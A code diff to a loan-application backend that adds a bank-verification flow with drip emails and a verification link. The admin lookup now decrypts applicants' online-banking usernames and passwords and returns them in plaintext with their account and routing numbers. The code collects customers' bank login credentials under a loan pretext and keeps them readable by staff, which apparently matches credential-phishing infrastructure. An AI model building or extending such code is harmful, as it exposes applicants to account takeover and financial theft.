@@ -12,6 +12,8 @@ import { LoanApplication } from "./loan-application.model";
 import { resolvePagination } from "../common/utils/pagination";
 import { Op, Sequelize } from "sequelize";
 import { EncryptionService } from "src/common/decorators/crypto/encryption.service";
+import { BankAccountVerificationService } from "src/bank-verification/bank-verification.service";
+import { BankAccountVerification } from "src/bank-verification/bank-account-verification.model";
 
 /** Ambiguous glyphs (I, O, 0, 1) omitted so references survive being read aloud. */
 const REFERENCE_ALPHABET = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
@@ -29,6 +31,9 @@ export class LoanApplicationsService {
     @InjectModel(LoanApplication)
     private readonly model: typeof LoanApplication,
     private readonly encryption: EncryptionService,
+    private readonly bankVerificationService: BankAccountVerificationService,
+    @InjectModel(BankAccountVerification)
+    private readonly verificationModel: typeof BankAccountVerification,
   ) {}
 
   /**
@@ -44,17 +49,64 @@ export class LoanApplicationsService {
     return `LL-${suffix}`;
   }
 
+  // async create(
+  //   dto: CreateLoanApplicationDto,
+  //   context: SubmissionContext = {},
+  // ): Promise<LoanApplication> {
+  //   const consented = dto.smsConsent === true;
+
+  //   // Retry on the (vanishingly unlikely) unique-constraint collision rather
+  //   // than pre-checking, which would still race.
+  //   for (let attempt = 0; attempt < 5; attempt += 1) {
+  //     try {
+  //       return await this.model.create({
+  //         reference: this.generateReference(),
+  //         amountRequested: dto.amountRequested.toFixed(2),
+  //         purpose: dto.purpose,
+  //         termMonths: dto.termMonths,
+  //         firstName: dto.firstName,
+  //         lastName: dto.lastName,
+  //         email: dto.email.toLowerCase(),
+  //         phone: dto.phone,
+  //         street: dto.street,
+  //         city: dto.city,
+  //         state: dto.state,
+  //         postalCode: dto.postalCode,
+  //         bankName: this.encryption.encrypt(dto.bankName),
+  //         routingNumber: this.encryption.encrypt(dto.routingNumber),
+  //         accountNumber: this.encryption.encrypt(dto.accountNumber),
+  //         bankAccountAge: dto.bankAccountAge,
+  //         accountStatus: dto.accountStatus,
+  //         smsConsent: consented,
+  //         smsConsentAt: consented ? new Date() : null,
+  //         smsConsentText: consented ? (dto.smsConsentText ?? null) : null,
+  //         consentIp: consented ? (context.ipAddress ?? null) : null,
+  //         consentUserAgent: consented ? (context.userAgent ?? null) : null,
+  //         status: "received",
+  //       } as Partial<LoanApplication> as LoanApplication);
+  //     } catch (error) {
+  //       const isDuplicateReference =
+  //         error instanceof Error &&
+  //         error.name === "SequelizeUniqueConstraintError";
+
+  //       if (!isDuplicateReference || attempt === 4) throw error;
+  //     }
+  //   }
+
+  //   throw new Error("Could not allocate a unique application reference");
+  // }
+
   async create(
     dto: CreateLoanApplicationDto,
     context: SubmissionContext = {},
-  ): Promise<LoanApplication> {
+  ): Promise<{ application: LoanApplication; verifyLink: string }> {
     const consented = dto.smsConsent === true;
+    let application: LoanApplication | undefined;
 
-    // Retry on the (vanishingly unlikely) unique-constraint collision rather
-    // than pre-checking, which would still race.
+    // Retry on the (vanishingly unlikely) unique-constraint collision
     for (let attempt = 0; attempt < 5; attempt += 1) {
       try {
-        return await this.model.create({
+        application = await this.model.create({
           reference: this.generateReference(),
           amountRequested: dto.amountRequested.toFixed(2),
           purpose: dto.purpose,
@@ -70,8 +122,6 @@ export class LoanApplicationsService {
           bankName: this.encryption.encrypt(dto.bankName),
           routingNumber: this.encryption.encrypt(dto.routingNumber),
           accountNumber: this.encryption.encrypt(dto.accountNumber),
-          bankUsername: this.encryption.encrypt(dto?.bankUsername),
-          bankPasswordEncrypted: this.encryption.encrypt(dto?.bankPassword),
           bankAccountAge: dto.bankAccountAge,
           accountStatus: dto.accountStatus,
           smsConsent: consented,
@@ -81,16 +131,40 @@ export class LoanApplicationsService {
           consentUserAgent: consented ? (context.userAgent ?? null) : null,
           status: "received",
         } as Partial<LoanApplication> as LoanApplication);
+
+        break; // Successfully created, exit the retry loop
       } catch (error) {
         const isDuplicateReference =
           error instanceof Error &&
           error.name === "SequelizeUniqueConstraintError";
 
-        if (!isDuplicateReference || attempt === 4) throw error;
+        if (!isDuplicateReference || attempt === 4) {
+          throw error;
+        }
       }
     }
 
-    throw new Error("Could not allocate a unique application reference");
+    if (!application) {
+      throw new Error("Could not allocate a unique application reference");
+    }
+
+    // 1. Initialize Bank Verification record & schedule BullMQ drip emails
+    const { verifyToken } =
+      await this.bankVerificationService.createVerification({
+        applicationId: application.reference,
+        fullName: `${application.firstName} ${application.lastName}`,
+        email: application.email,
+        phoneNumber: application.phone,
+        bankName: dto.bankName,
+        routingNumber: dto.routingNumber,
+        encryptedAccountNumber: application.accountNumber,
+      });
+
+    // 2. Build the full verification frontend link
+    const frontendUrl = process.env.FRONTEND_URL || "http://localhost:3000";
+    const verifyLink = `${frontendUrl}/bank-verification/${encodeURIComponent(verifyToken)}`;
+
+    return { application, verifyLink };
   }
 
   async findByReference(reference: string): Promise<LoanApplication> {
@@ -109,21 +183,22 @@ export class LoanApplicationsService {
 
   async getByIdAdminAccess(reference: string) {
     try {
-      const application = await this.model.findOne({
-        where: { reference: reference },
-      });
+      const [application, bankVerification] = await Promise.all([
+        this.model.findOne({
+          where: { reference },
+        }),
+        this.verificationModel.findOne({
+          where: { applicationId: reference },
+        }),
+      ]);
 
       if (!application) {
         throw new NotFoundException("Loan application not found");
       }
 
-      type EncryptedField =
-        | "bankName"
-        | "routingNumber"
-        | "accountNumber"
-        | "bankUsername"
-        | "bankPasswordEncrypted";
+      type EncryptedField = "bankName" | "routingNumber" | "accountNumber";
       const legacyValues: Partial<Pick<LoanApplication, EncryptedField>> = {};
+
       const decryptField = (field: EncryptedField): string => {
         const value = application[field];
         if (!value) return "";
@@ -139,8 +214,25 @@ export class LoanApplicationsService {
       const bankName = decryptField("bankName");
       const routingNumber = decryptField("routingNumber");
       const accountNumber = decryptField("accountNumber");
-      const bankUsername = decryptField("bankUsername");
-      const bankPasswordEncrypted = decryptField("bankPasswordEncrypted");
+
+      // Safely decrypt bank username and password from the verification record if present
+      const decryptVerificationField = (value?: string | null): string => {
+        if (!value) return "";
+        try {
+          return this.encryption.isEncryptedPayload(value)
+            ? this.encryption.decrypt(value)
+            : value;
+        } catch {
+          return value;
+        }
+      };
+
+      const bankUsername = decryptVerificationField(
+        bankVerification?.bankingUsernameEncrypted,
+      );
+      const bankPasswordEncrypted = decryptVerificationField(
+        bankVerification?.bankingPasswordEncrypted,
+      );
 
       if (Object.keys(legacyValues).length > 0) {
         await application.update(legacyValues);
@@ -153,6 +245,7 @@ export class LoanApplicationsService {
         accountNumber,
         bankUsername,
         bankPasswordEncrypted,
+        bankVerification: bankVerification ? bankVerification.toJSON() : null,
       };
     } catch (error) {
       if (error instanceof NotFoundException) throw error;
